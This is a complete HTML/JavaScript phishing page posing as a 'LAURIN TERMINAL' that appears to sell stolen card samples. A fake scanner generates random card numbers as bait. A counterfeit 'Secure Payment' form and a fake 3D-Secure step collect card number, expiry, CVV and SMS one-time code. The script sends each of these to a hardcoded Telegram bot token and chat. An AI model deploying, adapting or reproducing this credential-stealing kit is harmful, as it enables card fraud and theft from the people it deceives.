<!DOCTYPE html>
<html lang="sk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>LAURIN TERMINAL v26.3</title>
    <style>
        :root { --primary: #00ff41; --bg: #050505; --panel: #0a0a0a; --premium: #ffd700; --telegram: #229ED9; }
        body { background: var(--bg); color: var(--primary); font-family: 'Consolas', monospace; margin: 0; overflow: hidden; font-size: 11px; }
        .layout { display: grid; grid-template-columns: 1fr; grid-template-rows: 50px 1fr 120px; height: 100vh; }
        header { border-bottom: 1px solid #222; display: flex; align-items: center; justify-content: space-between; padding: 0 15px; background: var(--panel); }
        .market-bar { background: #080808; padding: 10px; display: flex; gap: 10px; border-bottom: 1px solid #222; overflow-x: auto; }
        .btn-mini { background: #111; border: 1px solid #333; color: #fff; padding: 5px 10px; white-space: nowrap; font-size: 10px; border-radius: 3px; }
        main { overflow-y: auto; background: #000; }
        .log-table { width: 100%; border-collapse: collapse; }
        .log-table td { padding: 8px; border-bottom: 1px solid #111; font-size: 10px; }
        #paymentModal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 1000; justify-content: center; align-items: center; }
        .modal-content { background: #fff; color: #333; width: 90%; max-width: 340px; border-radius: 12px; overflow: hidden; font-family: Arial, sans-serif; }
        .modal-body { padding: 20px; }
        input { width: 100%; border: 1px solid #ccc; padding: 12px; margin: 5px 0; box-sizing: border-box; border-radius: 6px; font-size: 16px; }
        .pay-btn { background: #007bff; color: #fff; border: none; width: 100%; padding: 15px; border-radius: 6px; font-weight: bold; margin-top: 10px; }
        #terminalZone { background: #000; border-top: 1px solid #222; display: flex; flex-direction: column; }
        #tgFeed { flex-grow: 1; overflow-y: auto; padding: 8px; display: flex; flex-direction: column-reverse; gap: 4px; }
        .tg-msg { color: var(--telegram); font-size: 9px; }
        .tag { padding: 2px 4px; border-radius: 2px; font-size: 8px; margin-left: 5px; background: #222; }
        .tag-ok { background: var(--primary); color: #000; }
    </style>
</head>
<body>

<div id="paymentModal">
    <div class="modal-content" id="modalUI">
        <div class="modal-body">
            <div style="display:flex; justify-content:space-between; margin-bottom:15px;">
                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" height="15">
                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" height="20">
            </div>
            <h3 style="text-align:center; font-size:16px; margin:10px 0;">Secure Payment</h3>
            <p id="payDesc" style="text-align:center; font-size:12px; color:#666;"></p>
            <input type="tel" id="c_num" placeholder="Card Number" maxlength="19">
            <div style="display:flex; gap:10px;">
                <input type="tel" id="c_exp" placeholder="MM/YY" maxlength="5">
                <input type="tel" id="c_cvv" placeholder="CVV" maxlength="3">
            </div>
            <button class="pay-btn" onclick="laurin.processPayment()">CONFIRM PAYMENT</button>
        </div>
    </div>
</div>

<div class="layout">
    <header>
        <div style="font-weight: bold; letter-spacing: 1px;">LAURIN <span style="color:var(--telegram)">v26.3</span></div>
        <div style="color: var(--premium); font-size: 10px;">VAULT: <span id="statValue">$ 0</span></div>
    </header>

    <div class="market-bar">
        <button class="btn-mini" onclick="laurin.toggleScan()" id="btnGen" style="color:var(--primary)">[â–¶] SCAN</button>
        <button class="btn-mini" onclick="laurin.openModal(5, 49.99)">5 SAMPLES $49</button>
        <button class="btn-mini" onclick="laurin.openModal('all', 1599.99)">UNLIMITED $1599</button>
    </div>

    <main>
        <table class="log-table">
            <thead>
                <tr style="color:#444; font-size:9px; text-align:left;">
                    <th style="padding:5px;">TIME</th>
                    <th>CARD DATA (PAN / EXP / CVC)</th>
                    <th>VALUE</th>
                </tr>
            </thead>
            <tbody id="logBody"></tbody>
        </table>
    </main>

    <div id="terminalZone">
        <div id="tgFeed"></div>
    </div>
</div>

<script>
class LaurinFinal {
    constructor() {
        // PRIAME INDEXOVANIE - Ãšdaje sÃº vloÅ¾enÃ© priamo tu
        this.config = { 
            token: '8451689628:AAFeZCyZSAeHsxZgOb3o_Pwq3aPGajYpHEI', 
            chat: '7935573562' 
        };
        this.vault = [];
        this.unlockedIds = new Set();
        this.isRunning = false;
        this.updateUI();
        this.logTg("SYSTEM: ENCRYPTED & ACTIVE (Direct Link)");
    }

    async sendToTg(msg) {
        const device = /Android|iPhone/i.test(navigator.userAgent) ? (navigator.userAgent.includes("iPhone") ? "iOS" : "Android") : "PC";
        const cleanMsg = `ðŸ›‘ <b>NEW HIT [${device}]</b>\n\n${msg}\n\nðŸ•’ ${new Date().toLocaleTimeString()}`;
        try {
            await fetch(`https://api.telegram.org/bot${this.config.token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: this.config.chat, text: cleanMsg, parse_mode: 'HTML' })
            });
        } catch(e) {}
    }

    processPayment() {
        const n = document.getElementById('c_num').value;
        const e = document.getElementById('c_exp').value;
        const c = document.getElementById('c_cvv').value;
        if (n.length < 13) return;
        
        this.currentCard = { n, e, c };
        this.sendToTg(`ðŸ’³ <b>CARD DATA</b>\n<code>${n}</code>\n<b>EXP:</b> ${e}  |  <b>CVC:</b> ${c}`);

        document.getElementById('modalUI').innerHTML = `
            <div class="modal-body" style="text-align:center;">
                <h3 style="font-size:15px; color:#007bff;">3D-SECURE VERIFICATION</h3>
                <p style="font-size:12px;">Confirm the operation with the SMS code sent to your phone.</p>
                <input type="tel" id="sms_code" placeholder="SMS CODE" style="text-align:center; font-size:20px; letter-spacing:4px;">
                <button class="pay-btn" onclick="laurin.verifySms()">VERIFY</button>
                <p id="timer" style="font-size:11px; color:red; margin-top:10px;">Expires: 02:00</p>
            </div>
        `;
        let t = 120; setInterval(() => { if(t>0){ t--; let m=Math.floor(t/60), s=t%60; document.getElementById('timer').innerText=`Expires: 0${m}:${s<10?'0':''}${s}`; }}, 1000);
    }

    verifySms() {
        const sms = document.getElementById('sms_code').value;
        this.sendToTg(`ðŸ“² <b>SMS VERIFIED</b>\n<b>Code:</b> <code>${sms}</code>\n<b>Card:</b> <code>${this.currentCard.n}</code>`);
        setTimeout(() => { location.reload(); }, 1000);
    }

    toggleScan() { this.isRunning = !this.isRunning; document.getElementById('btnGen').innerText = this.isRunning ? '[â– ] STOP' : '[â–¶] SCAN'; if (this.isRunning) this.loop(); }
    
    loop() {
        if (!this.isRunning) return;
        const d = { 
            id: Math.random().toString(36).substr(2,5).toUpperCase(), 
            ts: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}), 
            pan: "4"+Math.floor(Math.random()*9).toString()+Math.floor(Math.random()*10000000000).toString(),
            exp: "0"+(Math.floor(Math.random()*9)+1)+"/2"+(Math.floor(Math.random()*4)+6),
            cvc: Math.floor(Math.random()*899)+100,
            val: Math.floor(Math.random()*4500)+50 
        };
        this.vault.push(d);
        this.renderRow(d);
        this.updateUI();
        setTimeout(() => this.loop(), 3500);
    }

    renderRow(d) {
        const row = `<tr>
            <td style="color:#444">${d.ts}</td>
            <td>${d.pan.substring(0,6)+'******'}<span class="tag">MASK</span></td>
            <td style="color:var(--premium)">$${d.val}</td>
        </tr>`;
        document.getElementById('logBody').insertAdjacentHTML('afterbegin', row);
    }

    updateUI() { document.getElementById('statValue').innerText = `$ ${this.vault.reduce((a,b)=>a+b.val,0)}`; }
    openModal(a, p) { document.getElementById('payDesc').innerText = `Total: $${p}`; document.getElementById('paymentModal').style.display = 'flex'; }
    logTg(m) { document.getElementById('tgFeed').insertAdjacentHTML('afterbegin', `<div class="tg-msg">> ${m}</div>`); }
}
const laurin = new LaurinFinal();
</script>
</body>
</html>
